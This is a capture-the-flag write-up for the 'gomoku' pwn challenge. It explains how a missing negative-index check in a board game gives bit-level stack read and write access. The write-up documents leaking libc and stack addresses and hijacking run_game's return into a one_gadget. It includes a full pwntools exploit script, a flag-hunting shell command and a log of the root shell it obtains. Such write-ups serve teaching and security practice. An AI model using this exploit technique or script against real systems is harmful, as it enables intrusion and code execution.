# gomoku — vuwCTF 2026 (pwn)

> Strategic placement of stones. Out-of-the-box thinking.
> `nc gomoku.challenges.2026.vuwctf.com 9971`

**Flag:** `VuwCTF{caNt_r0P_wh3n_5_1n_4_r0W}`

---

## 1. Challenge files

```
gomoku                  # the challenge binary (x86-64 PIE, not stripped)
gomoku.c                # full source
libc.so.6                # glibc 2.39 (Ubuntu 2.39-0ubuntu8.6)
ld-linux-x86-64.so.2      # matching loader
```

`gomoku` is a tiny text-mode implementation of Gomoku (five-in-a-row) on a
16×16 board, stored as a 256-bit bitboard per player.

```
$ file gomoku
gomoku: ELF 64-bit LSB pie executable, x86-64, ... dynamically linked,
        interpreter ./ld-linux-x86-64.so.2, not stripped

$ readelf -d gomoku | grep -E 'FLAGS|BIND_NOW'
 0x000000000000001e (FLAGS)      BIND_NOW
 0x000000006ffffffb (FLAGS_1)    Flags: NOW PIE
```

Protections: **PIE**, **Full RELRO** (`BIND_NOW`), **NX** stack, and a
**stack canary** (`fs:0x28`) in every function that touches local buffers.
No `win()`/backdoor function, no `/bin/sh` string, nothing hard-coded to
lean on — the primitive has to do all the work.

---

## 2. Source review

The whole game state is one struct, allocated on `main()`'s stack:

```c
typedef struct {
    uint64_t cells[4];       // 256 bits; cells[0] = bits 0..63, ...
} Bitboard;

typedef struct {
    Bitboard side[2];        // side[BLACK], side[WHITE]
    int      turn;
    int      moves;
    char     p1[16];         // player names
    char     p2[16];
} Game;                      // sizeof(Game) == 0x68 (104 bytes)
```

and the per-move handler:

```c
int row, col;
if (scanf("%d %d", &row, &col) != 2) { ... continue; }

if (row > 15 || col > 15) {
    fprintf(out, "that square is off the board\n");
    continue;
}

long      idx  = (long)row * N + col;      // N == 16
Bitboard *bb   = &g->side[g->turn];
long      limb = idx >> 6;
unsigned  bit  = (unsigned)(idx & 63);

switch (choice) {
case 1:  // place
    bb->cells[limb] |= (1ULL << bit);
    g->moves++;
    if (has_five(bb)) { ...; return; }
    g->turn ^= 1;
    break;
case 2:  // remove
    bb->cells[limb] &= ~(1ULL << bit);
    break;
case 3:  // peek
    fprintf(out, "cell (%d,%d) = %d\n", row, col,
            (int)((bb->cells[limb] >> bit) & 1ULL));
    break;
}
```

**The bug:** `row` and `col` are only bounded from above. There is no
`row < 0` / `col < 0` check. `idx = (long)row*16 + col` is computed in
64-bit arithmetic (so it can't be tamed by 32-bit wraparound either), and
`limb = idx >> 6` indexes straight into `bb->cells[limb]` with **no bounds
check at all**.

That gives three primitives, each operating on a single bit at address
`bb + limb*8`, `limb = idx >> 6` (arithmetic shift), for **any** `idx` the
32-bit ints `row`/`col` can encode:

| choice | effect                                   | side effect            |
|--------|-------------------------------------------|-------------------------|
| 1 place  | `*addr \|=  (1 << bit)`                  | `g->turn ^= 1` (after `has_five()` check on the *real* board) |
| 2 remove | `*addr &= ~(1 << bit)`                   | none |
| 3 peek   | reads back `(*addr >> bit) & 1`           | none |

`bb` is `&g->side[turn]`, a **stack address**. So this is an arbitrary
*bit-level* read/write oracle relative to a known stack location — as long
as we can figure out where "known" points to under ASLR, and as long as
the target address is actually mapped.

---

## 3. Reachability: only *below* `&g`, and only "nearby"

Since `row, col ≤ 15` is the *only* check:

* **Max positive `idx`** = `15*16 + 15 = 255` → `limb` tops out at `3`,
  i.e. positive offsets can only reach `bb+0 .. bb+24` — that's just
  `side[turn].cells[0..3]` itself, the legitimate board. **We can never
  write above `&g`.** That rules out overwriting `main()`'s own saved
  return address, which sits *above* `&g` on the stack.
* **Min `idx`** ≈ `INT_MIN*16 + INT_MIN ≈ -2^35`, so `limb*8` can be as
  low as roughly **-4.3 GB** relative to `bb`. That sounds like a lot, but:

```
$ # measured gap between [stack] and libc.so.6 base, 15 local runs:
stack - libc_base ranges from ~2.4 TB to ~17.5 TB
```

Under full ASLR, libc/the loader/the PIE binary itself are **terabytes**
away from the stack (mmap-region and stack-region randomization are
independent). Our reachable window is only a few GB below `&g`, so **libc
and the binary are simply out of reach** through this primitive — we can
never directly `peek` a GOT entry or a `.text` byte. Everything useful has
to already be sitting *on the stack*, within a few KB of `&g`.

---

## 4. Finding `&g` and turning it into a formula

`main()`'s frame (disassembly, relevant bits):

```
1a39: push rbp
1a3a: mov  rbp, rsp
1a3d: sub  rsp, 0x70          ; Game g lives at [rbp-0x70] .. [rbp-0x08]
1a4a: mov  [rbp-0x8], canary
...
1ac4: call run_game
1ac9: mov  eax, 0             ; <- return address landing here
```

So `&g == rbp_main - 0x70`, and since `sizeof(Game) == 0x68`, that's
*exactly* `main`'s `rsp` right after the prologue — i.e. `&g == &g.side[BLACK]`.
`&g.side[WHITE]` is `&g + 0x20` (32 bytes later, `sizeof(Bitboard)`).

`run_game()`'s own prologue/epilogue:

```
16ae: push rbp                 ; [&g-16] = saved rbp (main's rbp)
16af: mov  rbp, rsp            ; rbp_rg = &g - 16
16b2: sub  rsp, 0x50
...
1a1b: mov  rax, [rbp-0x8]      ; canary check
1a1f: sub  rax, fs:0x28        ; rax == 0 here iff canary matches
1a28: je   1a37
...
1a37: leave                    ; rsp = rbp_rg (&g-16); pop rbp
1a38: ret                      ; pops [&g-8] into RIP
```

So two extremely useful, **fixed** offsets from `&g`:

* `&g - 8`  → `run_game()`'s saved return address (currently `main+0x1ac9`)
* `&g - 16` → `run_game()`'s saved RBP (currently `main`'s own `rbp`) —
  this becomes the live **RBP register** the instant before `ret` fires.

And crucially: **RAX is 0** at that exact `ret`, for free, because it's
the leftover result of the canary comparison.

I verified all of this empirically too — using a small ctypes/`ptrace`
harness (the sandbox's `yama.ptrace_scope=1` blocks `gdb -p <pid>` from a
sibling process, but a process *can* always ptrace its own child, so I
just called `ptrace(2)` directly from the Python process that spawned
`./gomoku`) I set a temporary `int3` at `run_game+0x38a` (the `ret`), let
it hit resign, and dumped registers right before that `ret`:

```
rax 0x0                     <- canary check result, always 0 on success
rbx 0x7ffcf8caf9d8           (some stack address, not NULL)
r12 0x1                      (definitely not a usable envp pointer)
rbp 0x7ffcf8caf8b0            = &g + 0x70   (matches the formula above)
rsp 0x7ffcf8caf838            = &g - 8
```

## 5. Leaking an address: leftover stack garbage

Even though `&g` itself is a moving target (stack ASLR), the *code path*
`main → read_names → run_game → { print_board, fprintf, scanf }` is 100%
deterministic. Every one of those library calls pushes its own frames,
locals and argument pointers onto the stack below `&g`, and — since none of
that memory gets zeroed on return — whatever they last wrote sits there as
"garbage" that is actually 100% reproducible relative to `&g`.

I dumped the live stack via `/proc/<pid>/mem` (again fine to do on our own
child process) right after `read_names()` returns, located `&g` precisely
by searching for our own `"AAAA\0"` name string, and then scanned every
qword below it, classifying each one against `/proc/<pid>/maps`:

```
off  value                          classification
-8   gomoku_base + 0x1ac9           run_game's own return address (into main)
-16  main's saved rbp               (&g + 0x70, as derived above)
-32  gomoku_base + 0x3d60           binary data pointer
-40  gomoku_base + 0x16ab           binary code pointer
-56  libc_base   + 0x2045c0         <<< a libc pointer, every single time
-72  gomoku_base + 0x1640
-88  &g  (itself!)                  <<< a self-referential leftover arg
-104 gomoku_base + 0x1773
-120 ld.so_base   + 0x38000
```

I reran this 8 times (fresh ASLR each time) and every one of these offsets
resolved to the *same relative* value on every single run — only the
module base changed. Two of them are exactly what's needed:

* **`&g - 56`** always equals `libc_base + 0x2045c0` → gives us `libc_base`.
* **`&g - 88`** always equals `&g` itself → gives us `&g` directly (no need
  to derive it from anything else).

Both offsets are read-only in the exploit (`peek`), so nothing about using
them can corrupt state.

---

## 6. Two dead ends worth documenting

### 6.1 Building a ROP chain in the *real* board cells

My first idea was the "obvious" one: overwrite `&g-8` with a `pop rdi; ret`
gadget and use `&g+0` / `&g+8` (i.e. `side[BLACK].cells[0]` and `cells[1]`,
the actual legitimate board!) to hold `"/bin/sh"` and `system`'s address,
since after `run_game`'s `ret`, `rsp` lands exactly on `&g`.

Problem: `cells[0..3]` is the board `has_five()` inspects **after every
single `place` call**. Writing an arbitrary 47/48-bit pointer's bits into
a 16×16 grid has a very real chance of accidentally lining up 5 consecutive
`1` bits in a row/column/diagonal before the second qword is fully written
— which ends the game (and returns through our half-written chain) early.

I ported `has_five()`'s exact bit logic to Python and Monte-Carlo'd it
over 20,000 simulated ASLR bases for `(binsh_addr, system_addr)` sitting in
`cells[0]`/`cells[1]`:

```python
def has_five_bits(cells):        # cells = [c0, c1, c2, c3], 1:1 port of has_five()
    def rshift256(inp, n):
        word, bit = n >> 6, n & 63
        out = [0, 0, 0, 0]
        for i in range(4):
            if i + word < 4:
                out[i] |= (inp[i + word] >> bit) & 0xFFFFFFFFFFFFFFFF
            if bit and i + word + 1 < 4:
                out[i] |= (inp[i + word + 1] << (64 - bit)) & 0xFFFFFFFFFFFFFFFF
        return out
    dirs = [(1, 0x0FFF0FFF0FFF0FFF), (16, 0xFFFFFFFFFFFFFFFF),
             (17, 0x0FFF0FFF0FFF0FFF), (15, 0xFFF0FFF0FFF0FFF0)]
    for s, mask in dirs:
        acc = list(cells)
        for k in range(1, 5):
            sh = rshift256(cells, s * k)
            acc = [a & b for a, b in zip(acc, sh)]
        acc = [a & mask for a in acc]
        if any(acc):
            return True
    return False

# result over 20,000 random (binsh_addr, system_addr) pairs:
# danger rate: 9063/20000 = 45.31%
```

**~45% of the time this chain triggers `has_five()` prematurely** and the
exploit just fails outright (harmlessly — the game ends normally). Doable
with retries, but not the "right" answer — see §6.2 and §7 for why it's
also unnecessary.

### 6.2 A scratch area further down the stack

Next idea: avoid the real board entirely, pivot into a scratch region much
further below `&g` (e.g. `&g-304`) that's *not* part of the persistent
`Game` struct, write a `[pop_rdi_ret, "/bin/sh", system]` chain there via
`leave;ret` + a controlled RBP, and never touch the visible board at all.

This *looked* clean, but writing there and reading it straight back showed
the value never changed — not even the first bit:

```
orig value at scratch offset: 0xe556f484daadf900
after setting bit 0:  0xe556f484daadf900   (unchanged!)
after setting bit 15: 0xe556f484daadf900   (unchanged!)
```

That offset sits inside the region that `print_board()`/`fprintf()`/`scanf()`
actively reuse on **every single loop iteration** (their internal locals,
buffers, saved registers, etc.). Since the same deterministic code runs
every iteration, that memory gets stomped back to the exact same
"garbage" value before our single-bit write is ever observed again — a
two-snapshot diff doesn't even catch it, because the "before" and "after"
snapshots of a full run are identical (rewritten to the same thing both
times); it's only *mid-sequence* writes that get erased. A deeper
byte-range diff after issuing dozens of unrelated commands confirmed the
"hot" zone is real, sparse, and includes exactly the range I'd picked.

Lesson: only `&g-8` and `&g-16` (both proven earlier to be genuinely
*static*, one-time-initialized slots — a return address and a saved frame
pointer, never touched again after `run_game`'s prologue) are safe to
write to and expect the value to stick.

---

## 7. The actual exploit: one_gadget, no ROP chain, no board writes

Given only `&g-8` and `&g-16` are reliably writable, and we already know
RAX is 0 for free at the moment `run_game` returns, the natural target is
a `one_gadget`:

```
$ one_gadget libc.so.6
...
0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```

* `rax == NULL` — **already true**, for free (the canary check).
* `address rbp-0x50 writable` — true for any stack address.
* `[rbp-0x78] == NULL` — we control RBP completely (via `&g-16`), so we
  just pick `RBP = &g + 0x98`, making `RBP - 0x78 == &g + 0x20 ==
  g.side[WHITE].cells[0]` — which is **always zero**, since the exploit
  never places a White stone.

So the whole exploit is exactly two 64-bit bit-level writes, both to
proven-stable offsets, and zero interaction with the real board:

```
&g - 16  (saved RBP)       = &g + 0x98
&g -  8  (return address)  = libc_base + 0xef52b
```

then `choice = 4` ("resign") makes `run_game()` hit its own `leave; ret`:

```
leave:  rsp = &g-16 ; pop rbp   -> RBP = &g+0x98
ret:    pop [&g-8] into RIP     -> jumps into the one_gadget, RSP = &g
```//

...and the one_gadget's own constraints are satisfied purely from state we
already set up: `rax == 0`, `[RBP-0x78] == [&g+0x20] == 0`. `execve("/bin/sh", ...)`
fires and we get a shell — as `root`, on the actual challenge server.

I confirmed the register-level mechanics first with the same
child-ptrace trick from §4 (force `RIP`/`RBP` at the breakpoint and
`PTRACE_CONT`), saw a `SIGTRAP` consistent with a successful `execve()`
(ptrace always reports a `SIGTRAP` stop right after a traced process's
`execve()` succeeds), detached, and the pipe indeed then behaved like a
shell. Then I reproduced the exact same effect purely through the game's
own `peek`/`place`/`remove` protocol (no ptrace at all) — see the script
below — and it worked identically, locally and against the remote.

One remaining practical wrinkle: the remote server has ~1 second of
latency per `peek`/`place`/`remove` round-trip (small, unbuffered I/O +
network RTT), and the exploit needs `64 × 2` leak bits and `64 × 2` write
bits ≈ 256 individual operations. Since `place`/`remove` don't return
anything we need to react to, and the entire write sequence (including
the deterministic `turn` flips caused by every `place`) can be computed
**locally, in advance**, the whole thing is pipelined: every command for a
phase is queued into one `send()`, and responses are parsed out of one big
buffered read — turning ~256 round trips into effectively 2.

---

## 8. Solution script

```python
#!/usr/bin/env python3
"""
gomoku - vuwCTF 2026 pwn solution

Bug: run_game() checks `row > 15 || col > 15` but never checks the lower
bound, so idx = row*16 + col (computed in 64-bit arithmetic) can be driven
deeply negative. That gives a *bit-granular* arbitrary read/write/clear
primitive relative to the stack address of `g.side[turn]`:

    3) peek   -> read  1 bit  (bb->cells[limb] >> bit) & 1
    1) place  -> OR    1 bit  bb->cells[limb] |=  (1 << bit)   [flips turn]
    2) remove -> AND   1 bit  bb->cells[limb] &= ~(1 << bit)   [turn unchanged]

Because only the upper bound is checked, idx can only go very negative, i.e.
we can only reach addresses *below* &g on the stack - never above it. That
rules out overwriting main()'s own return address (which sits above &g),
and it also puts libc/the binary itself out of reach (they live many
terabytes away from the stack under ASLR - well beyond what a 32-bit
row/col can express as a byte offset).

What *is* reachable and useful, a few dozen/hundred bytes below &g:
  - run_game()'s own saved return address (into main)      @ &g - 8
  - run_game()'s own saved RBP (popped by its `leave`)      @ &g - 16
  - leftover pointers that scanf/fprintf's internals leave behind on the
    stack from previous calls - these are 100% deterministic across runs
    (same code path every time) even though their *values* change with
    ASLR. Two of them are used here as our address leak:
      &g - 56  ==  libc_base + 0x2045c0   (glibc 2.39, stable internal ptr)
      &g - 88  ==  &g                     (a self-referential leftover arg)

Exploit:
  1. Leak libc_base and &g (bb_black) via the offsets above (peek, 64 bits
     each, batched into one send to dodge remote latency).
  2. Overwrite run_game's saved RBP with (&g + 0x98) and its return address
     with a one_gadget (libc+0xef52b: execve("/bin/sh", rbp-0x50, [rbp-0x78])).
       - one_gadget needs rax == NULL: true for free, since the instruction
         right before `leave;ret` is the canary check `sub rax, fs:0x28`,
         which leaves rax == 0 when the canary matches.
       - one_gadget needs [rbp-0x78] == NULL: satisfied by pointing our
         controlled RBP so that rbp-0x78 lands on g.side[WHITE].cells[0],
         which is always zero (we never place a White stone).
     Both writes land on the two "quiet" offsets above (-8/-16) - nothing
     else ever touches them, so the bits stick.
  3. choice=4 (resign) makes run_game() `leave; ret` into the one_gadget.

No ROP chain is needed, and the *real* board cells are never touched, so
there's no risk of accidentally completing a five-in-a-row mid-write (the
original approach of stashing a ROP chain in the real board cells has a
~45% chance of prematurely triggering has_five() and ending the game -
see WRITEUP.md, section 6.1).

Usage:
    python3 solve.py            # connect to the remote instance
    python3 solve.py --local    # spawn & exploit ./gomoku locally (for testing)
"""
from pwn import *
import sys
import re
import time

context.log_level = 'info'
context.arch = 'amd64'

HOST = 'gomoku.challenges.2026.vuwctf.com'
PORT = 9971

LOCAL = '--local' in sys.argv

# --- one_gadget (libc.so.6, glibc 2.39) ---------------------------------
# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
# constraints: address rbp-0x50 is writable
#              rax == NULL
#              [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
ONE_GADGET_OFF = 0xef52b
LIBC_LEAK_TO_BASE = 0x2045c0   # &g-56 leftover pointer == libc_base + this

# --- stack offsets, all relative to bb_black = &g -----------------------
LIBC_LEAK_OFF = -56    # leftover pointer -> libc_base + LIBC_LEAK_TO_BASE
BBBLACK_LEAK_OFF = -88  # leftover pointer -> &g itself
RETADDR_OFF = -8       # run_game's saved return address (into main)
SAVEDRBP_OFF = -16     # run_game's saved rbp (becomes RBP right before `leave;ret`'s `ret`)


def idx_to_rowcol(idx):
    """Inverse of idx = row*16 + col using floor division (row/col can be negative)."""
    row = idx // 16
    col = idx - row * 16
    return row, col


def make_idx(byte_off, bit):
    limb = byte_off // 8
    return limb * 64 + bit


class Game:
    """Thin wrapper around the gomoku protocol implementing the bit-level
    read/write primitive, with batching so we don't pay a network
    round-trip per bit against the remote server."""

    def __init__(self, io):
        self.io = io
        self.turn = 0  # 0 = BLACK, 1 = WHITE (place stone toggles this)
        self.io.recvuntil(b'Black player, enter your name: ')
        self.io.sendline(b'AAAA')
        self.io.recvuntil(b'White player, enter your name: ')
        self.io.sendline(b'BBBB')
        self.io.recvuntil(b'> ')

    def _adjust(self, byte_off_black):
        """&g varies with whose turn it is (side[BLACK] vs side[WHITE] are
        32 bytes apart), so re-express a fixed target address relative to
        whichever side is currently 'bb' in the running process."""
        return byte_off_black if self.turn == 0 else byte_off_black - 0x20

    def leak_qwords_batch(self, byte_offs):
        """Read several 64-bit values (peek only, never touches turn)."""
        assert self.turn == 0
        blob = b''
        for off in byte_offs:
            off_adj = self._adjust(off)
            for bit in range(64):
                idx = make_idx(off_adj, bit)
                row, col = idx_to_rowcol(idx)
                blob += b'3\n' + f"{row} {col}\n".encode()
        self.io.send(blob)

        total_bits = len(byte_offs) * 64
        results = []
        buf = b''
        while len(results) < total_bits:
            buf += self.io.recv(timeout=30)
            results = re.findall(rb'cell \((-?\d+),(-?\d+)\) = (\d)', buf)
        self.io.recvuntil(b'> ', timeout=5)

        bitvals = [int(b) for (_, _, b) in results[:total_bits]]
        vals = []
        for i in range(len(byte_offs)):
            v = 0
            for bit in range(64):
                v |= bitvals[i * 64 + bit] << bit
            vals.append(v)
        return vals

    def write_qwords_batch(self, off_value_pairs):
        """Write several 64-bit values. Since place/remove don't depend on
        server feedback, the whole command sequence (including the turn
        flips caused by every 'place') can be precomputed locally and sent
        as one blob."""
        cmds = []
        for byte_off_black, value in off_value_pairs:
            for bit in range(64):
                desired = (value >> bit) & 1
                off_adj = self._adjust(byte_off_black)
                idx = make_idx(off_adj, bit)
                row, col = idx_to_rowcol(idx)
                if desired:
                    cmds.append(f"1\n{row} {col}\n")
                    self.turn ^= 1
                else:
                    cmds.append(f"2\n{row} {col}\n")
        self.io.send(''.join(cmds).encode())
        time.sleep(0.05)

    def resign(self):
        self.io.sendline(b'4')


def main():
    if LOCAL:
        io = process('./gomoku')
    else:
        io = remote(HOST, PORT)

    g = Game(io)

    log.info("leaking libc base + &g (stack) ...")
    t0 = time.time()
    libc_leak, bb_black = g.leak_qwords_batch([LIBC_LEAK_OFF, BBBLACK_LEAK_OFF])
    libc_base = libc_leak - LIBC_LEAK_TO_BASE
    log.success(f"libc_base = {hex(libc_base)}   &g = {hex(bb_black)}   ({time.time()-t0:.1f}s)")

    one_gadget = libc_base + ONE_GADGET_OFF
    rbp_value = bb_black + 0x98  # so that [rbp_value - 0x78] == g.side[WHITE].cells[0] == 0
    log.info(f"one_gadget = {hex(one_gadget)}   rbp_pivot = {hex(rbp_value)}")

    log.info("overwriting run_game()'s saved RBP + return address ...")
    t0 = time.time()
    g.write_qwords_batch([(SAVEDRBP_OFF, rbp_value), (RETADDR_OFF, one_gadget)])
    log.success(f"writes sent ({time.time()-t0:.1f}s)")

    try:
        io.recv(timeout=2)  # drain queued board output
    except Exception:
        pass

    log.info("choice=4 (resign) -> run_game() leave;ret -> one_gadget")
    g.resign()
    time.sleep(0.5)

    io.sendline(b'cat flag* /flag* /app/flag* 2>/dev/null || '
                b'find / -maxdepth 3 -iname "*flag*" -exec cat {} \\; 2>/dev/null')
    time.sleep(1.5)
    try:
        print(io.recvrepeat(timeout=5).decode(errors='replace'))
    except Exception:
        pass

    io.interactive()


if __name__ == '__main__':
    main()
```

(saved alongside this writeup as [`solve.py`](solve.py))

---

## 9. Running it

```
$ python3 solve.py
[+] Opening connection to gomoku.challenges.2026.vuwctf.com on port 9971: Done
[*] leaking libc base + &g (stack) ...
[+] libc_base = 0x7f747022c000   &g = 0x7ffc8f71ec40   (4.4s)
[*] one_gadget = 0x7f747031b52b   rbp_pivot = 0x7ffc8f71ecd8
[*] overwriting run_game()'s saved RBP + return address ...
[+] writes sent (0.1s)
[*] choice=4 (resign) -> run_game() leave;ret -> one_gadget
BBBB resigns. Goodbye.
$ id
uid=0(root) gid=0(root) groups=0(root)
$ pwd
/app
$ cat flag.txt
VuwCTF{caNt_r0P_wh3n_5_1n_4_r0W}
```

---

## 10. Root cause & takeaway

One missing `< 0` check on `row`/`col` turned into a fully general
bit-level arbitrary-address read/write/clear oracle — no leak of the
binary or libc addresses was even possible through the primitive itself
(they're TBs away from the reachable stack window), so the whole exploit
had to be built entirely out of address bits *already sitting on the
stack* as call-chain leftovers, plus two struct fields (`saved RBP`,
`saved return address`) that happened to be both writable and, unlike
almost everything else nearby, never touched again after being written
once. The flag title says it best: you genuinely can't build a five-gadget
ROP chain when writing your gadget addresses risks completing a real
"five in a row" out from under you.
